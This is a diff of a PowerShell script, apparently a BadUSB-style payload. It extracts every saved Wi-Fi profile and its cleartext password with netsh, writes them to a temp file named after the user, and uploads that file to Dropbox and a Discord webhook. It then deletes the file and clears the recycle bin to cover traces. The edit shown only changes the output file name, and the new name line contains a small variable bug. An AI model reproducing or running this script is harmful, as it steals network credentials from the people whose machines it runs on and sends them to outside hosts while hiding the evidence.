@@ -1,9 +1,36 @@
 ############################################################################################################################################################
 
+# Intro ---------------------------------------------------------------------------------------------------
+ function Get-fullName {
+
+    try {
+
+    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
+
+    }
+ 
+ # If no name is detected function will return $env:UserName 
+
+    # Write Error is just for troubleshooting 
+    catch {Write-Error "No name was detected" 
+    return $env:UserName
+    -ErrorAction SilentlyContinue
+    }
+
+    return $fullName 
+
+}
+
+$fullName = Get-fullName
+
+$filename = "$env:TEMP/$(fullName)-$(get-date -f yyyy-MM-dd).txt"
+
+############################################################################################################################################################
+
 $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
 
 
-$wifiProfiles > $env:TEMP/--wifi-pass.txt
+$wifiProfiles > $filename
 
 ############################################################################################################################################################
 
@@ -29,7 +56,7 @@ $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
 }
 
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TEMP/--wifi-pass.txt}
+if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $filename}
 
 ############################################################################################################################################################
 
@@ -56,7 +83,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$filename"}
 
  
 
@@ -83,4 +110,4 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
 
 
-RI $env:TEMP/--wifi-pass.txt
+RI $filename
